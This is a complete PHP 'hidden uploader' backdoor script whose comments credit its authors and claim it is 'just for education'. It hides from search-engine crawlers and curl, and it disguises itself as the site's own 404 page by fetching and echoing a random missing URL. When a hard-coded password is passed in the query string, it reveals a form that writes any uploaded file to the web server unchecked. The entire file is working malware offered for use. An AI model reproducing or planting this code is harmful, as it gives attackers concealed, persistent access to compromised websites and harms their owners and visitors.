<?php
/*  DwiyanTech Hidden Uploader Greets Thanks To Afrizal F A   */
/* 404 NOT FOUND METHOD Uploader  With Get Method */
/* Enjoy It Just For Education :) LUN4T1C_ HIDDEN UPLOADER V1.3  */ 

$pw = "dwiyantech";
error_reporting(0);
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

 
function login(){
$rand = rand();
$ur = 'http://'.$_SERVER['HTTP_HOST']."/".$rand;
$curl = curl_init();
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_URL, $ur);
curl_setopt($curl, CURLOPT_VERBOSE, false);
$raw = curl_exec($curl);
$out = str_replace('/'.$rand, $_SERVER['SCRIPT_NAME'], $raw);
echo $out;
curl_close($curl);


}


if($_GET['lunatic'] == $pw){


if(isset($_POST['btn']))
{
    $nama= $_FILES['wos']['name'];
    $lokasi = $_FILES['wos']['tmp_name'];
    $folder="";
    if(move_uploaded_file($lokasi,$folder.$nama))
    {
echo'berhasil upload file :)';  }else{
        echo'gagal upload file :';
    }
}
echo'

<fieldset><legend> Upload Here ;</legend>
<form action="" method="post" enctype="multipart/form-data">
<input type="file" name="wos">
<button type="submit" name="btn" id="btn">upload !</button>
</form></div>
</fieldset>
';
} else {
echo login();
}
?>
